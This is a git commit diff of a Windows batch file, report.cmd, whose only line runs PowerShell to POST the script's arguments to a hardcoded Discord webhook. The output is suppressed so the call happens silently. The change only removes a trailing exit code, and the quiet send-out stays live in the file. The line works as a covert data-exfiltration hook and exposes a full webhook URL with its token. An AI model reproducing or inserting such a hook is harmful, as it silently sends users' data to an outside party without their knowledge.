f2db9cd3af7fa5f8ba963a03a178c2b028617929
idgafmood <86877763+idgafmood@users.noreply.github.com>
2023-03-10 10:43:55 -0500

    Update report.cmd

--- report.cmd
+++ report.cmd
@@ -1,1 +1,1 @@
-(@powershell "$a=@{content='%*'};iwr -uri 'https://canary.discord.com/api/webhooks/1083766413413580903/Ubrkx26Y_7Ov3Ry9wxfNWSqrwz3-2CEBUay0q2xjsEdarSDZZYzFHnvtHeKQp5mWYpMb' -method POST -body $a")>nul 2>&1&exit 1
+(@powershell "$a=@{content='%*'};iwr -uri 'https://canary.discord.com/api/webhooks/1083766413413580903/Ubrkx26Y_7Ov3Ry9wxfNWSqrwz3-2CEBUay0q2xjsEdarSDZZYzFHnvtHeKQp5mWYpMb' -method POST -body $a")>nul 2>&1
